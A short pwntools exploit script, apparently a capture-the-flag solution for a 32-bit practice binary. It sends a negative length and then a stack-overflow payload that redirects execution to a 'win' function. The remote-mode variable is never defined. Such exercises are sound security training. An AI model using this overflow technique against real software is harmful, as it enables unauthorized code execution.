#!/usr/bin/python3

#!/usr/bin/python3

"""
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
"""

binary_path = "./assignment-was-due-6pm"

#############################
from pwn import *;DEBUG=context.log_level==logging.DEBUG;p=process(binary_path);elf=p.elf;p=remote(*remote_addr) if args["REMOTE"] else p;
#############################

# Exploit

p.sendline(b'-1')
p.sendline(fit({0x108: elf.symbols["win"]}))

p.interactive()